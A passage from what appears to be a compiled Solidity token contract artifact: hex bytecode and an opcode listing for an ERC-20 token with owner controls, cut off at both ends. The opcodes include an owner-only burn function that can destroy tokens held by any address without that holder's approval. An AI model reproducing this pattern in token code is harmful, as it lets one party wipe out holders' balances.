6038101906102199190610ebc565b6104ab565b005b61023a60048036038101906102359190610ebc565b6104d4565b6040516102479190610f17565b60405180910390f35b61026a6004803603810190610265919061103d565b6104f7565b6040516102779190610f41565b60405180910390f35b61029a60048036038101906102959190610fe6565b61057e565b005b6060600380546102ab906110ac565b80601f01602080910402602001604051908101604052809291908181526020018280546102d7906110ac565b80156103245780601f106102f957610100808354040283529160200191610324565b820191906000526020600020905b81548152906001019060200180831161030757829003601f168201915b5050505050905090565b600080610339610604565b905061034681858561060c565b600191505092915050565b6000600254905090565b600080610366610604565b905061037385828561061e565b61037e8585856106b2565b60019150509392505050565b60006012905090565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6103e36107a6565b6103ed600061082d565b565b6000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b606060048054610428906110ac565b80601f0160208091040260200160405190810160405280929190818152602001828054610454906110ac565b80156104a15780601f10610476576101008083540402835291602001916104a1565b820191906000526020600020905b81548152906001019060200180831161048457829003601f168201915b5050505050905090565b6104b36107a6565b6104d082670de0b6b3a7640000836104cb919061110c565b6108f3565b5050565b6000806104df610604565b90506104ec8185856106b2565b600191505092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b6105866107a6565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036105f85760006040517f1e4fbdf70000000000000000000000000000000000000000000000000000000081526004016105ef9190611022565b60405180910390fd5b6106018161082d565b50565b600033905090565b6106198383836001610975565b505050565b600061062a84846104f7565b90507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff81146106ac578181101561069c578281836040517ffb8f41b20000000000000000000000000000000000000000000000000000000081526004016106939392919061114e565b60405180910390fd5b6106ab84848484036000610975565b5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16036107245760006040517f96c6fd1e00000000000000000000000000000000000000000000000000000000815260040161071b9190611022565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036107965760006040517fec442f0500000000000000000000000000000000000000000000000000000000815260040161078d9190611022565b60405180910390fd5b6107a1838383610b4c565b505050565b6107ae610604565b73ffffffffffffffffffffffffffffffffffffffff166107cc6103ef565b73ffffffffffffffffffffffffffffffffffffffff161461082b576107ef610604565b6040517f118cdaa70000000000000000000000000000000000000000000000000000000081526004016108229190611022565b60405180910390fd5b565b6000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905081600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036109655760006040517f96c6fd1e00000000000000000000000000000000000000000000000000000000815260040161095c9190611022565b60405180910390fd5b61097182600083610b4c565b5050565b600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16036109e75760006040517fe602df050000000000000000000000000000000000000000000000000000000081526004016109de9190611022565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610a595760006040517f94280d62000000000000000000000000000000000000000000000000000000008152600401610a509190611022565b60405180910390fd5b81600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508015610b46578273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92584604051610b3d9190610f41565b60405180910390a35b50505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610b9e578060026000828254610b929190611185565b92505081905550610c71565b60008060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905081811015610c2a578381836040517fe450d38c000000000000000000000000000000000000000000000000000000008152600401610c219392919061114e565b60405180910390fd5b8181036000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610cba5780600260008282540392505081905550610d07565b806000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051610d649190610f41565b60405180910390a3505050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610dab578082015181840152602081019050610d90565b60008484015250505050565b6000601f19601f8301169050919050565b6000610dd382610d71565b610ddd8185610d7c565b9350610ded818560208601610d8d565b610df681610db7565b840191505092915050565b60006020820190508181036000830152610e1b8184610dc8565b905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610e5382610e28565b9050919050565b610e6381610e48565b8114610e6e57600080fd5b50565b600081359050610e8081610e5a565b92915050565b6000819050919050565b610e9981610e86565b8114610ea457600080fd5b50565b600081359050610eb681610e90565b92915050565b60008060408385031215610ed357610ed2610e23565b5b6000610ee185828601610e71565b9250506020610ef285828601610ea7565b9150509250929050565b60008115159050919050565b610f1181610efc565b82525050565b6000602082019050610f2c6000830184610f08565b92915050565b610f3b81610e86565b82525050565b6000602082019050610f566000830184610f32565b92915050565b600080600060608486031215610f7557610f74610e23565b5b6000610f8386828701610e71565b9350506020610f9486828701610e71565b9250506040610fa586828701610ea7565b9150509250925092565b600060ff82169050919050565b610fc581610faf565b82525050565b6000602082019050610fe06000830184610fbc565b92915050565b600060208284031215610ffc57610ffb610e23565b5b600061100a84828501610e71565b91505092915050565b61101c81610e48565b82525050565b60006020820190506110376000830184611013565b92915050565b6000806040838503121561105457611053610e23565b5b600061106285828601610e71565b925050602061107385828601610e71565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806110c457607f821691505b6020821081036110d7576110d661107d565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061111782610e86565b915061112283610e86565b925082820261113081610e86565b91508282048414831517611147576111466110dd565b5b5092915050565b60006060820190506111636000830186611013565b6111706020830185610f32565b61117d6040830184610f32565b949350505050565b600061119082610e86565b915061119b83610e86565b92508282019050808211156111b3576111b26110dd565b5b9291505056fea2646970667358221220da64986efe334ff5837b986db8a789595ef8a676806085e4ac809b5c5513312f64736f6c63430008150033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xCF JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x715018A6 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0x9DC29FAC GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x9DC29FAC EQ PUSH2 0x204 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x220 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x280 JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x715018A6 EQ PUSH2 0x1BE JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x1C8 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x1E6 JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xD4 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0xF2 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x122 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x140 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x170 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x18E JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xDC PUSH2 0x29C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xE9 SWAP2 SWAP1 PUSH2 0xE01 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x10C PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x107 SWAP2 SWAP1 PUSH2 0xEBC JUMP JUMPDEST PUSH2 0x32E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x119 SWAP2 SWAP1 PUSH2 0xF17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x12A PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x137 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x15A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x155 SWAP2 SWAP1 PUSH2 0xF5C JUMP JUMPDEST PUSH2 0x35B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x167 SWAP2 SWAP1 PUSH2 0xF17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x178 PUSH2 0x38A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x185 SWAP2 SWAP1 PUSH2 0xFCB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1A8 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1A3 SWAP2 SWAP1 PUSH2 0xFE6 JUMP JUMPDEST PUSH2 0x393 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1B5 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1C6 PUSH2 0x3DB JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1D0 PUSH2 0x3EF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1DD SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1EE PUSH2 0x419 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1FB SWAP2 SWAP1 PUSH2 0xE01 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x21E PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x219 SWAP2 SWAP1 PUSH2 0xEBC JUMP JUMPDEST PUSH2 0x4AB JUMP JUMPDEST STOP JUMPDEST PUSH2 0x23A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x235 SWAP2 SWAP1 PUSH2 0xEBC JUMP JUMPDEST PUSH2 0x4D4 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x247 SWAP2 SWAP1 PUSH2 0xF17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x26A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x265 SWAP2 SWAP1 PUSH2 0x103D JUMP JUMPDEST PUSH2 0x4F7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x277 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x29A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x295 SWAP2 SWAP1 PUSH2 0xFE6 JUMP JUMPDEST PUSH2 0x57E JUMP JUMPDEST STOP JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH2 0x2AB SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x2D7 SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 ISZERO PUSH2 0x324 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2F9 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x324 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x307 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x339 PUSH2 0x604 JUMP JUMPDEST SWAP1 POP PUSH2 0x346 DUP2 DUP6 DUP6 PUSH2 0x60C JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x366 PUSH2 0x604 JUMP JUMPDEST SWAP1 POP PUSH2 0x373 DUP6 DUP3 DUP6 PUSH2 0x61E JUMP JUMPDEST PUSH2 0x37E DUP6 DUP6 DUP6 PUSH2 0x6B2 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x12 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3E3 PUSH2 0x7A6 JUMP JUMPDEST PUSH2 0x3ED PUSH1 0x0 PUSH2 0x82D JUMP JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH2 0x428 SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x454 SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 ISZERO PUSH2 0x4A1 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x476 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x4A1 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x484 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x4B3 PUSH2 0x7A6 JUMP JUMPDEST PUSH2 0x4D0 DUP3 PUSH8 0xDE0B6B3A7640000 DUP4 PUSH2 0x4CB SWAP2 SWAP1 PUSH2 0x110C JUMP JUMPDEST PUSH2 0x8F3 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x4DF PUSH2 0x604 JUMP JUMPDEST SWAP1 POP PUSH2 0x4EC DUP2 DUP6 DUP6 PUSH2 0x6B2 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x586 PUSH2 0x7A6 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x5F8 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x1E4FBDF700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x5EF SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x601 DUP2 PUSH2 0x82D JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x619 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x975 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x62A DUP5 DUP5 PUSH2 0x4F7 JUMP JUMPDEST SWAP1 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 EQ PUSH2 0x6AC JUMPI DUP2 DUP2 LT ISZERO PUSH2 0x69C JUMPI DUP3 DUP2 DUP4 PUSH1 0x40 MLOAD PUSH32 0xFB8F41B200000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x693 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x114E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x6AB DUP5 DUP5 DUP5 DUP5 SUB PUSH1 0x0 PUSH2 0x975 JUMP JUMPDEST JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x724 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x96C6FD1E00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x71B SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x796 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0xEC442F0500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x78D SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x7A1 DUP4 DUP4 DUP4 PUSH2 0xB4C JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x7AE PUSH2 0x604 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x7CC PUSH2 0x3EF JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x82B JUMPI PUSH2 0x7EF PUSH2 0x604 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH32 0x118CDAA700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x822 SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP2 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x965 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x96C6FD1E00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x95C SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x971 DUP3 PUSH1 0x0 DUP4 PUSH2 0xB4C JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x9E7 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0xE602DF0500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x9DE SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0xA59 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x94280D6200000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xA50 SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 PUSH1 0x1 PUSH1 0x0 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP1 ISZERO PUSH2 0xB46 JUMPI DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP5 PUSH1 0x40 MLOAD PUSH2 0xB3D SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0xB9E JUMPI DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0xB92 SWAP2 SWAP1 PUSH2 0x1185 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH2 0xC71 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP DUP2 DUP2 LT ISZERO PUSH2 0xC2A JUMPI DUP4 DUP2 DUP4 PUSH1 0x40 MLOAD PUSH32 0xE450D38C00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC21 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x114E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 DUP2 SUB PUSH1 0x0 DUP1 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0xCBA JUMPI DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH2 0xD07 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 DUP5 PUSH20 